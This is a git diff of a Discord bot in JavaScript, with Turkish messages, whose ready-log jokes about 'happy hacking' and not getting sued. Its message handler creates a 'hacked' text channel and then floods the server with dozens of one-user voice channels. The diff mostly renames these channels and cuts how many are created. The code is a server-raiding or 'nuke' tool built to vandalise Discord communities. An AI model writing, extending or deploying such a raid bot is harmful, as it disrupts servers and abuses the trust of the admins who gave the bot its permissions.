@@ -6,7 +6,7 @@ const request = require("request");
 client.login(ayarlar.token);
 client.on('ready', () => {
  client.user.setActivity(`↪💖 Destek sunucusu: https://discord.gg/dCbWgZtRFB |!yardım| `)
- console.log(`${client.user.tag} bot aktifleştirildi hayırlı hacklemeler dikkat dava açmasınlar! >:D`);
+ console.log(`${client.user.tag} bot aktifleştirildi hayırlı hacklemeler dikkat dava açmasınlar! >:D by melik ama yıkık olandan alayım#0061 `);
 });
 
 
@@ -49,1201 +49,331 @@ client.on("message", async msg => {
     await msg.guild.channels.create("hacked", {
       type: "text"
     });
-      await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+      
+        await msg.guild.createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", { ///hacked
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED xD", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {  ///hacked
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED xD", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {  ///hacked
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-    
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED xD", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", { ///hacked
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-    
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED xD", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");  
-      });
-    
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED xD", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild
-      .createChannel("HACKED", {
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {  ///hacked
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");  ///hacked
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("HACKED", {  ///hacked
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })   ///hacked
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {  ///hacked
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })   ///hacked
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild  ///hacked
-      .createChannel("HACKED xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"     ///hacked
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })  ///hacked
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKED", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });                      ///hacked
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
     
  
  
